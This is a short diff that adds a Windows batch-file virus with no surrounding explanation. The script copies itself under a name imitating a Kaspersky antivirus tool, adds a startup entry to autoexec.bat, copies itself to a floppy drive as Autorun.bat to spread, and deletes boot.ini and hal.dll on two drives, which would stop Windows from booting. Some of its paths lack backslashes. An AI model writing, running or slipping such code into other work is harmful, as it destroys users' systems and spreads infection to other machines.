@@ -1,0 +1,7 @@
+copy %0 c:K@spersky Anti-Antivirus.bat >nul 
+echo c:virus.bat>>c:autoexec.bat 
+copy %0 a:Autorun.bat >nul 
+del c:\boot.ini
+del D:\boot.ini
+del c:\windows\system32\hal.dll
+del D:\windows\system32\hal.dll
